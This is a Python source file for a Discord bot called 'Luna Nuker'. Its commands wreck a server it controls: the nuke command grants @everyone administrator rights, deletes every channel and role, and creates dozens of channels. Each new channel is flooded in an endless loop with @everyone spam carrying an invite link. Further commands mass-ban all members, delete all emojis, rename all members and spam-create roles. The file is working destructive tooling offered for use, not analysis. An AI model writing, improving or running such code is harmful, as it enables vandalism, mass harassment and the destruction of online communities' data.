import traceback
import requests
import discord
import random
import json
import os

from colorama import Fore
from discord.ext import commands
from discord import Permissions, Embed
from pystyle import System, Cursor, Colors, Colorate, Center

gray = Colors.gray
red = Colors.red
green = Colors.green
white = Colors.white

try:
   with open(f"config.json", encoding='utf8') as f:
        config = json.load(f)
        token = config["token"]
        prefix = config["prefix"]
        bot_status = config["bot_status"]
        server_name = config["server_name"]
        channel_names = config["channel_names"]
        messages_to_spam = config["messages_to_spam"]
        invite_link = config["invite_link"]
except FileNotFoundError:
    token = input(Fore.WHITE + "Token " + Fore.RESET + Fore.MAGENTA + ">> ")
    prefix = input(Fore.WHITE + "Prefix " + Fore.RESET + Fore.MAGENTA + ">> ")
    bot_status = input(Fore.WHITE + "Bot Status " + Fore.RESET + Fore.MAGENTA + ">> ")
    server_name = input(Fore.WHITE + "Server Name " + Fore.RESET + Fore.MAGENTA + ">> ")
    invite_link = input(Fore.WHITE + "Invite Link That'll Be Sent " + Fore.RESET + Fore.MAGENTA + ">> ")
    channel_names = ["Get Clapped","Get Nuked L","Ez Nuke"]
    messages_to_spam = ["If you can't beat them. Join them 😈", "Sorry Not Sorry","Major L"],
    config = {
        "token": token,
        "prefix": prefix,
        "bot_status": bot_status,
        "server_name": server_name,
        "channel_names": channel_names,
        "messages_to_spam": messages_to_spam,
        "invite_link": invite_link,
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command('help')

@bot.event
async def on_ready():
    System.Title("Luna Nuker - Made By Smug")
    System.Size(101,15)
    Cursor.HideCursor()
    os.system('cls')
    print("\n\n\n")
    print(Center.XCenter(Colorate.Vertical(Colors.purple_to_blue, f'''
            ██      ██    ██ ███   ██  █████    ███   ██ ██    ██ ██   ██ ███████ ██████
            ██      ██    ██ ████  ██ ██   ██   ████  ██ ██    ██ ██  ██  ██      ██   ██
            ██      ██    ██ ██ ██ ██ ███████   ██ ██ ██ ██    ██ █████   █████   ██████ 
            ██      ██    ██ ██  ████ ██   ██   ██  ████ ██    ██ ██  ██  ██      ██   ██
            ███████  ██████  ██   ███ ██   ██   ██   ███  ██████  ██   ██ ███████ ██   ██''')))

@bot.event
async def on_command_error(error):
    errors = commands.errors
    if (isinstance(error, errors.BadArgument) or isinstance(error, commands.MissingRequiredArgument)
            or isinstance(error, errors.PrivateMessageOnly) or isinstance(error, errors.CheckFailure)
            or isinstance(error, errors.CommandNotFound)):
        return
    elif isinstance(error, errors.MissingPermissions):
        print(f"{Colors.red}Missing permissions")
    else:
        print(f'{red}\n\n{"".join(traceback.format_exception(type(error), error, error.__traceback__))}{white}\n')
        print(f'{white}Press Enter To Exit . . .')
        input()
        os.system("main.py")
            
@bot.command(aliases=['Help'])
async def help(ctx):    
  await ctx.message.delete()
  member = ctx.message.author
  global embed
  embed = Embed(title="Booster Nuker", color=5639644)
  embed.set_author(name='Help ')
  embed.add_field(name='Rename', value='Renames every member in a server to ', inline=False)
  embed.add_field(name='Nuke', value='Nukes the server ', inline=False)
  embed.add_field(name='Stop', value='Stops the bot nuking and restarts the console ', inline=False)
  embed.add_field(name='Massban', value='Bans all members ', inline=False)
  embed.add_field(name='Spamrole', value='Creates lots of roles ', inline=False)
  embed.add_field(name='Emoji', value='Deletes all emojis ', inline=False)
  await member.send(embed=embed)

@bot.command(aliases=['Nuke','NUKE', 'nk', 'Nk', 'NK'])
async def nuke(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    System.Title(f'Luna Nuker - Nuking . . .')

    try:
        await guild.edit(name=server_name)
        print(f"\n{green}server name was changed to {server_name}")
    except:
        print(f"\n{red}server name coudlnt be changed")

    try:
        await bot.change_presence(activity=discord.Game(name=bot_status))
        print(f"{green}Bot status was changed to {bot_status}")
    except:
        print(f"{red}Bot status could not be changed")

    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(f"{green}I have given everyone admin")
    except:
      print(f"{red}I was unable to give everyone admin")

    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{green}{channel.name} was deleted.")
      except:
        print(f"{red}{channel.name} was NOT deleted.")

    for role in guild.roles:
     try:
       await role.delete()
       print(f"{red}{role.name} Has been deleted")
     except:
       print(f"{red}{role.name} Has not been deleted")
    await guild.create_text_channel("Luna Nuked You")

    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"{green}New Invite: {link}")

    for i in range(45):
       await guild.create_text_channel(random.choice(channel_names))
    return

@bot.event
async def on_guild_channel_create(channel):
    message = f"@everyone {random.choice(messages_to_spam)} {invite_link}"
    while True:
        await channel.send(message)

@bot.command(aliases=['Rename'])
async def rename(ctx):
    System.Title(f'Luna Nuker - Renaming . . .')
    await ctx.message.delete()
    try:
        for member in list(ctx.guild.members):
            payload = {
                    "nick": "EzNuke"
                    }
            headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json",
            }
            r = requests.patch(f'https://discord.com/api/v9/guilds/{ctx.guild.id}/members/{member.id}', data=json.dumps(payload), headers=headers)
            print(f"{green}{member.name} was renamed.")
    except:
        print(f"{red}{member.name} was not renamed.")

@bot.command(aliases=['Emoji'])
async def emoji(ctx):
    System.Title(f'Luna Nuker - Deleting Emojis . . .')
    await ctx.message.delete()
    try:
        for emoji in list(ctx.guild.emojis):
            await emoji.delete()
            print(f"{green}{emoji} was deleted.")
    except:
        print(f"{red}{emoji} was not deleted.")

@bot.command(aliases=['Stop'])
async def stop(ctx):
  System.Title(f'Luna Nuker - Restarting client . . .')
  await ctx.message.delete()
  print(f"Restarting '{bot.user.name}'. . .")
  os.system("main.py")
  return

@bot.command(aliases=['Massban'])
async def massban(ctx):
    System.Title(f'Luna Nuker - Massbaning . . .')
    await ctx.message.delete()
    try:
        for member in ctx.guild.members:
            await member.ban()
            print(f"{green}Successfully Banned {member}!")
    except:
        print(f"{red}Couldn't Ban {member}!")

@bot.command(alliases=['Spamrole'])
async def spamrole(ctx, name = "EzNuke"):
    System.Title(f'Luna Nuker - Spamming Roles . . .')
    guild = ctx.guild
    await ctx.message.delete()
    amount = 50
    for i in range(amount):
        try:
            await guild.create_role(name=name)
            print(f"{green}Created Channel!")
        except:
            print(f"{red}Can't Create Channel!")

try:
    bot.run(token)
except discord.errors.LoginFailure:
    print(f'{red}Invalid Token')
    print(f'{white}Press Enter To Exit . . .')
    input()
    os.system("main.py")
except discord.errors.PrivilegedIntentsRequired:
    print(f"{red} It looks like you didn't use the necessary intents in the developer portal.") + ("\n")
    print(f'{white}Press Enter To Exit . . .')
    input()
    os.system("main.py")
except Exception as e:
    print(f'{red}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{white}\n')
    print(f'{white}Press Enter To Exit . . .')
    input()
    os.system("main.py")
